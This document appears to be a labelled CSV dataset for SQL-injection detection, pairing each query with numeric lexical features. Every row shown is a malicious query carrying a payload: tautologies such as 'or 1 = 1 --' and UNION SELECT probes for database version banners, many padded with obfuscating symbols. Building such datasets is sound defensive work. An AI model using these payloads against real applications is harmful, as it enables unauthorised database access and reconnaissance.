Sentence,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
 select * from users where id = 1 or \<  = 1 or 1 = 1 -- 1,1,58,18,0,0,7,1,0,18,0,2,3,0,0,26,5,0,1
" select * from users where id = 1 or \<  = 1 union select 1,@@version -- 1",1,74,17,0,0,9,1,0,17,0,1,3,0,0,42,4,0,2
 select * from users where id = 1 or !<@ or 1 = 1 -- 1,1,54,16,0,0,8,1,0,16,0,3,3,0,0,26,4,0,1
" select * from users where id = 1 or !<@ union select 1,version (  )  -- 1",1,74,17,0,0,10,1,0,17,0,2,3,0,0,42,3,0,2
" select * from users where id = 1 or @`\` union select 1,version (  )  -- 1",1,75,17,0,0,10,1,0,17,0,1,3,0,0,42,3,0,2
" select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1,79,19,0,0,11,1,0,19,0,1,3,0,0,42,4,0,2
" select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1",1,78,19,0,0,11,1,0,19,0,1,3,0,0,42,4,0,2
 select * from users where id = 1 + ( \ )  or 1 = 1 -- 1,1,56,18,0,0,8,1,0,18,0,1,4,0,0,24,4,0,1
" select * from users where id = 1 + ( \ )  union select null,@@version -- 1",1,75,17,0,0,10,1,0,17,0,0,4,1,0,44,2,1,2
" select * from users where id = 1.&&1 union select 1,version (  )  -- 1",1,71,15,0,0,10,1,0,15,0,1,3,0,0,40,4,0,2
 select * from users where id = 1. or 1 = 1 -- 1,1,48,14,0,0,6,1,0,14,0,1,3,0,0,24,4,0,1
" select * from users where id = 1.&&@ union select 1,version (  )  -- 1",1,71,15,0,0,11,1,0,15,0,1,3,0,0,40,3,0,2
 select * from users where id = 1 +  ( \. )  or 1 = 1 -- 1,1,58,18,0,0,9,1,0,18,0,1,4,0,0,24,4,0,1
" select * from users where id = 1 +  ( \. )  union select null,@@version -- 1",1,77,17,0,0,11,1,0,17,0,0,4,1,0,44,2,1,2
" select * from users where id = 1.  union select 1,version (  )  -- 1",1,69,15,0,0,8,1,0,15,0,0,3,0,0,40,3,0,2
" select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",1,93,19,0,0,8,1,0,19,0,0,3,0,0,62,4,0,2
" select * from users where id = 1.  union select version (  ) ,version (  )  -- 1",1,81,18,0,0,10,1,0,18,0,0,3,0,0,47,2,0,2
" select * from users where id = 1. union select null,version (  )  -- 1",1,71,15,0,0,8,1,0,15,0,0,3,1,0,44,2,1,2
" select * from users where id = 1 +\. union select null,@@version -- 1",1,70,14,0,0,9,1,0,14,0,0,4,1,0,44,2,1,2
" select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1,96,19,0,0,8,1,0,19,0,0,3,1,0,66,3,1,2
 select * from users where id = 1. <@ or 1 = 1 -- 1,1,51,15,0,0,8,1,0,15,0,1,3,0,0,24,4,0,1
 select * from users where id = 1.<@. or 1 = 1 -- 1,1,51,14,0,0,9,1,0,14,0,1,3,0,0,24,4,0,1
" select * from users where id = 1.<@. union select 1,version (  )  -- 1",1,71,15,0,0,11,1,0,15,0,0,3,0,0,40,3,0,2
 select * from users where id = 1.*1 or 1 = 1 -- 1,1,50,14,0,0,7,1,0,14,0,1,4,0,0,24,5,0,1
" select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",1,95,19,0,0,9,1,0,19,0,0,4,0,0,62,5,0,2
" select * from users where id = 1.<1# union select 1,version (  )  -- 1",1,71,15,0,0,10,1,0,15,0,0,3,0,0,40,4,0,2
" select * from users where id = 1. <@ union select 1,version (  )  -- 1",1,71,16,0,0,10,1,0,16,0,0,3,0,0,40,3,0,2
" select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1",1,83,19,0,0,12,1,0,19,0,0,3,0,0,47,2,0,2
" select * from users where id = 1.*\ union select null,@@version -- 1",1,69,13,0,0,9,1,0,13,0,0,4,1,0,44,2,1,2
 select * from users where id = 1.<@$ or 1 = 1 -- 1,1,51,14,0,0,9,1,0,14,0,1,3,0,0,24,4,0,1
" select * from users where id = 1.<@$ union select 1,version (  )  -- 1",1,71,15,0,0,11,1,0,15,0,0,3,0,0,40,3,0,2
 select * from users where id = 1.%@ or 1 = 1 -- 1,1,50,14,0,0,8,1,0,14,1,1,3,0,0,24,4,0,1
" select * from users where id = 1.%@ union select 1,version (  )  -- 1",1,70,15,0,0,10,1,0,15,1,0,3,0,0,40,3,0,2
" select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",1,96,19,0,0,9,1,0,19,0,1,3,0,0,62,6,0,2
 select * from users where id = 1 +1 or 1 = 1 -- 1,1,50,15,0,0,6,1,0,15,0,1,4,0,0,24,5,0,1
 select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1,56,18,0,0,8,1,0,18,0,1,4,0,0,24,5,0,1
" select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1,101,23,0,0,10,1,0,23,0,0,4,0,0,62,5,0,2
" select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1",1,104,23,0,0,10,1,0,23,0,0,4,1,0,66,4,1,2
" select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",1,95,20,0,0,8,1,0,20,0,0,4,0,0,62,5,0,2
" select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1,98,20,0,0,8,1,0,20,0,0,4,1,0,66,4,1,2
" select * from users where id = 11<1# union select 1,version (  )  -- 1",1,71,15,0,0,9,1,0,15,0,0,3,0,0,40,5,0,2
 select * from users where id = 1 +  ( \+ )  or 1 = 1 -- 1,1,58,18,0,0,9,1,0,18,0,1,5,0,0,24,4,0,1
" select * from users where id = 1 +  ( \+ )  union select null,@@version -- 1",1,77,17,0,0,11,1,0,17,0,0,5,1,0,44,2,1,2
" select * from users where id = 1 +\+. union select null,@@version -- 1",1,71,14,0,0,10,1,0,14,0,0,5,1,0,44,2,1,2
" select * from users where id = 1 -1<@ union select 1,version (  )  -- 1",1,72,16,0,0,10,1,0,16,0,0,4,0,0,40,4,0,2
" select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1",1,84,19,0,0,12,1,0,19,0,0,4,0,0,47,3,0,2
" select * from users where id = 1 +1<@ union select null,version (  )  -- 1",1,75,16,0,0,10,1,0,16,0,0,4,1,0,44,3,1,2
 select * from users where id = 1 + \+%\ or 1 = 1 -- 1,1,54,16,0,0,8,1,0,16,1,1,5,0,0,24,4,0,1
 select * from users where id = 1 + \+%1 or 1 = 1 -- 1,1,54,16,0,0,8,1,0,16,1,1,5,0,0,24,5,0,1
" select * from users where id = 1 + \+%1 union select null,@@version -- 1",1,73,15,0,0,10,1,0,15,1,0,5,1,0,44,3,1,2
" select * from users where id = 1 + \+*\ union select null,@@version -- 1",1,73,15,0,0,10,1,0,15,0,0,5,1,0,44,2,1,2
 select * from users where id = 1 + \+%$ or 1 = 1 -- 1,1,54,16,0,0,9,1,0,16,1,1,5,0,0,24,4,0,1
" select * from users where id = 1 + \+*$ union select null,@@version -- 1",1,73,15,0,0,11,1,0,15,0,0,5,1,0,44,2,1,2
" select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1",1,98,22,0,0,9,1,0,22,0,0,3,0,0,62,4,0,2
" select * from users where id = 1 union select 1||1,version (  )  -- 1",1,70,15,0,0,9,1,0,15,0,1,3,0,0,40,4,0,2
" select * from users where id = 1 union select 1||@,version (  )  -- 1",1,70,15,0,0,10,1,0,15,0,1,3,0,0,40,3,0,2
" select * from users where id = 1 union select 1 1$,version (  )  -- 1",1,70,16,0,0,8,1,0,16,0,0,3,0,0,40,4,0,2
" select * from users where id = 1 union select 1 $,version (  )  -- 1",1,69,16,0,0,8,1,0,16,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 union select 1 1a,version (  )  -- 1",1,70,16,0,0,7,1,0,16,0,0,3,0,0,41,4,0,2
" select * from users where id = 1 union select 1<@$,version (  )  -- 1",1,70,15,0,0,10,1,0,15,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1,92,19,0,0,7,1,0,19,0,0,3,0,0,62,4,0,2
" select * from users where id = 1 union select .1_,version (  )  -- 1",1,69,15,0,0,9,1,0,15,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 union select 1`\`,version (  )  -- 1",1,70,15,0,0,9,1,0,15,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",1,94,19,0,0,8,1,0,19,0,0,3,0,0,63,4,0,2
" select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1",1,93,19,0,0,7,1,0,19,0,0,3,0,0,63,4,0,2
" select * from users where id = 1 union select .1$_,version (  )  -- 1",1,70,15,0,0,10,1,0,15,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 union select 1<@,version (  )  -- 1",1,69,15,0,0,9,1,0,15,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 union select 1<@.,version (  )  -- 1",1,70,15,0,0,10,1,0,15,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 union select 1 $$,version (  )  -- 1",1,70,16,0,0,9,1,0,16,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 union select !<1,version (  )  -- 1",1,69,15,0,0,9,1,0,15,0,1,3,0,0,40,3,0,2
" select * from users where id = 1 union select +!<1,version (  )  -- 1",1,70,15,0,0,10,1,0,15,0,1,4,0,0,40,3,0,2
" select * from users where id = 1 union select +!<@,version (  )  -- 1",1,70,15,0,0,11,1,0,15,0,1,4,0,0,40,2,0,2
" select * from users where id = 1 union select !<@,version (  )  -- 1",1,69,15,0,0,10,1,0,15,0,1,3,0,0,40,2,0,2
" select * from users where id = 1 union select @||1,version (  )  -- 1",1,70,15,0,0,10,1,0,15,0,1,3,0,0,40,3,0,2
" select * from users where id = 1 union select @&&@,version (  )  -- 1",1,70,15,0,0,11,1,0,15,0,1,3,0,0,40,2,0,2
" select * from users where id = 1 union select @ 1$,version (  )  -- 1",1,70,16,0,0,9,1,0,16,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 union select  @ $,version (  )  -- 1",1,70,16,0,0,9,1,0,16,0,0,3,0,0,40,2,0,2
" select * from users where id = 1 union select @ 1a,version (  )  -- 1",1,70,16,0,0,8,1,0,16,0,0,3,0,0,41,3,0,2
" select * from users where id = 1 union select @<@$,version (  )  -- 1",1,70,15,0,0,11,1,0,15,0,0,3,0,0,40,2,0,2
" select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1",1,97,19,0,0,7,1,0,19,0,0,3,1,0,66,3,1,2
" select * from users where id = 1 union select @ _,version (  )  -- 1",1,69,16,0,0,9,1,0,16,0,0,3,0,0,40,2,0,2
" select * from users where id = 1 union select @ $_,version (  )  -- 1",1,70,16,0,0,10,1,0,16,0,0,3,0,0,40,2,0,2
" select * from users where id = 1 union select @<@,version (  )  -- 1",1,69,15,0,0,10,1,0,15,0,0,3,0,0,40,2,0,2
" select * from users where id = 1 union select @<@.,version (  )  -- 1",1,70,15,0,0,11,1,0,15,0,0,3,0,0,40,2,0,2
" select * from users where id = 1 union select @ $$,version (  )  -- 1",1,70,16,0,0,10,1,0,16,0,0,3,0,0,40,2,0,2
 select * from users where id = 1 +$ . or 1 = 1 -- 1,1,52,16,0,0,8,1,0,16,0,1,4,0,0,24,4,0,1
" select * from users where id = 1 +$ . union select null,@@version -- 1",1,71,15,0,0,10,1,0,15,0,0,4,1,0,44,2,1,2
 select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1,52,16,0,0,7,1,0,16,0,1,4,0,0,24,5,0,1
" select * from users where id = 1 +$ 1 union select null,@@version -- 1",1,71,15,0,0,9,1,0,15,0,0,4,1,0,44,3,1,2
 select * from users where id = 1 +$+ or 1 = 1 -- 1,1,51,15,0,0,8,1,0,15,0,1,5,0,0,24,4,0,1
 select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1,1,58,18,0,0,10,1,0,18,0,1,5,0,0,24,4,0,1
" select * from users where id = 1 +  ( $+ )  union select null,@@version -- 1",1,77,17,0,0,12,1,0,17,0,0,5,1,0,44,2,1,2
 select * from users where id = 1 +$+. or 1 = 1 -- 1,1,52,15,0,0,9,1,0,15,0,1,5,0,0,24,4,0,1
" select * from users where id = 1 +$+. union select null,@@version -- 1",1,71,14,0,0,11,1,0,14,0,0,5,1,0,44,2,1,2
" select * from users where id = 1 +$+ union select null,@@version -- 1",1,70,14,0,0,10,1,0,14,0,0,5,1,0,44,2,1,2
 select * from users where id = 1 + $+%\ or 1 = 1 -- 1,1,54,16,0,0,9,1,0,16,1,1,5,0,0,24,4,0,1
 select * from users where id = 1 + $+%1 or 1 = 1 -- 1,1,54,16,0,0,9,1,0,16,1,1,5,0,0,24,5,0,1
" select * from users where id = 1 + $+%1 union select null,@@version -- 1",1,73,15,0,0,11,1,0,15,1,0,5,1,0,44,3,1,2
" select * from users where id = 1 + $+*\ union select null,@@version -- 1",1,73,15,0,0,11,1,0,15,0,0,5,1,0,44,2,1,2
 select * from users where id = 1 + $+%$ or 1 = 1 -- 1,1,54,16,0,0,10,1,0,16,1,1,5,0,0,24,4,0,1
" select * from users where id = 1 + $+*$ union select null,@@version -- 1",1,73,15,0,0,12,1,0,15,0,0,5,1,0,44,2,1,2
 select * from users where id = 1 <@ or 1 = 1 -- 1,1,50,15,0,0,7,1,0,15,0,1,3,0,0,24,4,0,1
 select * from users where id = 1 % ( \ )  or 1 = 1 -- 1,1,56,18,0,0,8,1,0,18,1,1,3,0,0,24,4,0,1
" select * from users where id = 1 * ( \ )  union select null,@@version -- 1",1,75,17,0,0,10,1,0,17,0,0,4,1,0,44,2,1,2
 select * from users where id = 1 % ( 1 )  or 1 = 1 -- 1,1,56,18,0,0,8,1,0,18,1,1,3,0,0,24,5,0,1
" select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1,101,23,0,0,10,1,0,23,0,0,4,0,0,62,5,0,2
 select * from users where id = 1 % ( $ )  or 1 = 1 -- 1,1,56,18,0,0,9,1,0,18,1,1,3,0,0,24,4,0,1
 select * from users where id = 1 % ( @ )  or 1 = 1 -- 1,1,56,18,0,0,9,1,0,18,1,1,3,0,0,24,4,0,1
 select * from users where id = 1 <@. or 1 = 1 -- 1,1,51,15,0,0,8,1,0,15,0,1,3,0,0,24,4,0,1
 select * from users where id = 1 <@.. or 1 = 1 -- 1,1,52,15,0,0,9,1,0,15,0,1,3,0,0,24,4,0,1
" select * from users where id = 1<@.. union select 1,version (  )  -- 1",1,71,15,0,0,11,1,0,15,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 <@. union select 1,version (  )  -- 1",1,71,16,0,0,10,1,0,16,0,0,3,0,0,40,3,0,2
" select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1",1,84,19,0,0,12,1,0,19,0,0,3,0,0,47,2,0,2
" select * from users where id = 1 *\. union select null,@@version -- 1",1,70,14,0,0,9,1,0,14,0,0,4,1,0,44,2,1,2
 select * from users where id = 1 <@.$ or 1 = 1 -- 1,1,52,15,0,0,9,1,0,15,0,1,3,0,0,24,4,0,1
" select * from users where id = 1 <@.$ union select 1,version (  )  -- 1",1,72,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
 select * from users where id = 1 *1 or 1 = 1 -- 1,1,50,15,0,0,6,1,0,15,0,1,4,0,0,24,5,0,1
" select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",1,95,20,0,0,8,1,0,20,0,0,4,0,0,62,5,0,2
" select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",1,98,20,0,0,8,1,0,20,0,0,4,1,0,66,4,1,2
" select * from users where id = 1 <1## union select 1,version (  )  -- 1",1,72,16,0,0,10,1,0,16,0,0,3,0,0,40,4,0,2
 select * from users where id = 1 <@1$ or 1 = 1 -- 1,1,52,15,0,0,8,1,0,15,0,1,3,0,0,24,5,0,1
" select * from users where id = 1 <@1$ union select 1,version (  )  -- 1",1,72,16,0,0,10,1,0,16,0,0,3,0,0,40,4,0,2
" select * from users where id = 1 *\ union select null,@@version -- 1",1,69,14,0,0,8,1,0,14,0,0,4,1,0,44,2,1,2
 select * from users where id = 1 <@$ or 1 = 1 -- 1,1,51,15,0,0,8,1,0,15,0,1,3,0,0,24,4,0,1
 select * from users where id = 1 %$ . or 1 = 1 -- 1,1,52,16,0,0,8,1,0,16,1,1,3,0,0,24,4,0,1
" select * from users where id = 1 *$ . union select null,@@version -- 1",1,71,15,0,0,10,1,0,15,0,0,4,1,0,44,2,1,2
 select * from users where id = 1 %$ 1 or 1 = 1 -- 1,1,52,16,0,0,7,1,0,16,1,1,3,0,0,24,5,0,1
" select * from users where id = 1 %$ 1 union select null,@@version -- 1",1,71,15,0,0,9,1,0,15,1,0,3,1,0,44,3,1,2
 select * from users where id = 1 <@$_ or 1 = 1 -- 1,1,52,15,0,0,9,1,0,15,0,1,3,0,0,24,4,0,1
" select * from users where id = 1 <@$_ union select 1,version (  )  -- 1",1,72,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
 select * from users where id = 1 <@<@ or 1 = 1 -- 1,1,52,15,0,0,9,1,0,15,0,1,3,0,0,24,4,0,1
 select * from users where id = 1 %!<1 or 1 = 1 -- 1,1,52,15,0,0,8,1,0,15,1,2,3,0,0,24,5,0,1
" select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1",1,97,21,0,0,9,1,0,21,0,0,3,0,0,62,5,0,2
" select * from users where id = 1<@<@ union select 1,version (  )  -- 1",1,71,15,0,0,11,1,0,15,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1",1,84,19,0,0,13,1,0,19,0,0,3,0,0,47,2,0,2
" select * from users where id = 1 <@<@ union select null,version (  )  -- 1",1,75,16,0,0,11,1,0,16,0,0,3,1,0,44,2,1,2
 select * from users where id = 1 %!<@ or 1 = 1 -- 1,1,52,15,0,0,9,1,0,15,1,2,3,0,0,24,4,0,1
" select * from users where id = 1 <@&@ union select 1,version (  )  -- 1",1,72,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
" select * from users where id = 1 <@$$ union select 1,version (  )  -- 1",1,72,16,0,0,11,1,0,16,0,0,3,0,0,40,3,0,2
 select * from users where id = 1 &@ or 1 = 1 -- 1,1,50,15,0,0,7,1,0,15,0,1,3,0,0,24,4,0,1
" select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'",1,82,19,3,0,14,1,0,19,0,2,4,0,0,42,5,0,2
" select * from users where id = '1' or  ( \ )  = 1 union select 1,@@version -- 1'",1,81,19,3,0,13,1,0,19,0,1,3,0,0,42,4,0,2
" select * from users where id = '1' or  ( \. )  = 1 union select 1,@@version -- 1'",1,82,19,3,0,14,1,0,19,0,1,3,0,0,42,4,0,2
" select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1,110,25,3,0,13,1,0,25,0,1,3,0,0,64,6,0,2
 select * from users where id = '1' or \.<\ or 1 = 1 -- 1',1,58,16,3,0,10,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id = '1' or \.<1 union select 1,@@version -- 1'",1,74,15,3,0,12,1,0,15,0,1,3,0,0,42,4,0,2
" select * from users where id = '1' or \.<\ union select 1,@@version -- 1'",1,74,15,3,0,12,1,0,15,0,1,3,0,0,42,3,0,2
" select * from users where id = '1' or \.<$ union select 1,@@version -- 1'",1,74,15,3,0,13,1,0,15,0,1,3,0,0,42,3,0,2
" select * from users where id = '1' or \.<  = 1 union select 1,@@version -- 1'",1,78,17,3,0,13,1,0,17,0,1,3,0,0,42,4,0,2
" select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",1,99,20,3,0,12,1,0,20,0,1,3,0,0,62,5,0,2
 select * from users where id = '1'   or 1 = 1 -- 1',1,52,14,3,0,8,1,0,14,0,1,3,0,0,24,4,0,1
" select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'",1,105,23,3,0,12,1,0,23,0,1,3,0,0,64,6,0,2
" select * from users where id = '1' or $ . = 1 union select 1,@@version -- 1'",1,77,18,3,0,13,1,0,18,0,1,3,0,0,42,4,0,2
 select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',1,61,19,3,0,10,1,0,19,0,2,3,0,0,26,6,0,1
" select * from users where id = '1' or $ 1 = 1 union select 1,@@version -- 1'",1,77,18,3,0,12,1,0,18,0,1,3,0,0,42,5,0,2
 select * from users where id = '1' or $<\ or 1 = 1 -- 1',1,57,16,3,0,10,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id = '1' or $<\. union select 1,@@version -- 1'",1,74,15,3,0,13,1,0,15,0,1,3,0,0,42,3,0,2
" select * from users where id = '1' or $<\ union select 1,@@version -- 1'",1,73,15,3,0,12,1,0,15,0,1,3,0,0,42,3,0,2
" select * from users where id = '1' or $+<$ union select 1,@@version -- 1'",1,74,15,3,0,14,1,0,15,0,1,4,0,0,42,3,0,2
 select * from users where id = '1' or \<\. or 1 = 1 -- 1',1,58,16,3,0,10,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id = '1' or \<\. union select 1,@@version -- 1'",1,74,15,3,0,12,1,0,15,0,1,3,0,0,42,3,0,2
 select * from users where id = '1' or \<1 or 1 = 1 -- 1',1,57,16,3,0,9,1,0,16,0,2,3,0,0,26,5,0,1
" select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'",1,77,17,3,0,12,1,0,17,0,2,3,0,0,42,4,0,2
" select * from users where id = '1' or \<\ union select 1,@@version -- 1'",1,73,15,3,0,11,1,0,15,0,1,3,0,0,42,3,0,2
 select * from users where id = '1' or \<$ or 1 = 1 -- 1',1,57,16,3,0,10,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id = '1' or \<$ union select 1,@@version -- 1'",1,73,15,3,0,12,1,0,15,0,1,3,0,0,42,3,0,2
" select * from users where id = '1' or \<  = 1 union select 1,@@version -- 1'",1,77,17,3,0,12,1,0,17,0,1,3,0,0,42,4,0,2
 select * from users where id = '1' or !<@ or 1 = 1 -- 1',1,57,16,3,0,11,1,0,16,0,3,3,0,0,26,4,0,1
" select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'",1,77,17,3,0,13,1,0,17,0,2,3,0,0,42,3,0,2
" select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'",1,86,22,3,0,14,1,0,22,0,1,3,0,0,42,5,0,2
" select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'",1,81,20,3,0,12,1,0,20,0,1,3,0,0,42,5,0,2
" select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'",1,82,20,3,0,13,1,0,20,0,1,3,0,0,42,5,0,2
" select * from users where id = 1 or "" (  ) "" or 1 = 1 -- 1",1,59,19,0,2,9,1,0,19,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1",1,61,20,0,2,10,1,0,20,0,2,3,0,0,26,5,0,1
" select * from users where id = 1 or "" ( ."" or 1 = 1 -- 1",1,57,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",1,57,18,0,2,8,1,0,18,0,2,3,0,0,26,5,0,1
" select * from users where id = 1 or "" ( ;"" or 1 = 1 -- 1",1,57,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",1,57,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or 1#"" (  union select 1,version (  )  -- 1",1,77,18,0,1,10,1,0,18,0,1,3,0,0,42,4,0,2
" select * from users where id = 1 or 1#"" (  union select version (  ) ,version (  )  -- 1",1,89,21,0,1,12,1,0,21,0,1,3,0,0,49,3,0,2
" select * from users where id = 1 or 1#"" (  union select 'a',version (  )  -- 1",1,79,18,2,1,12,1,0,18,0,1,3,0,0,43,3,0,2
" select * from users where id = 1 or 1#"" (  union select null,version (  )  -- 1",1,80,18,0,1,10,1,0,18,0,1,3,1,0,46,3,1,2
" select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",1,57,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or "" ( ["" or 1 = 1 -- 1",1,57,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1",1,57,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or @#"" (  = 1 or 1 = 1 -- 1",1,61,19,0,1,10,1,0,19,0,2,3,0,0,26,5,0,1
" select * from users where id = 1 or @#"" (  = 1 union select 1,version (  )  -- 1",1,81,20,0,1,12,1,0,20,0,1,3,0,0,42,4,0,2
" select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1",1,57,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or "" ( @"" or 1 = 1 -- 1",1,57,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
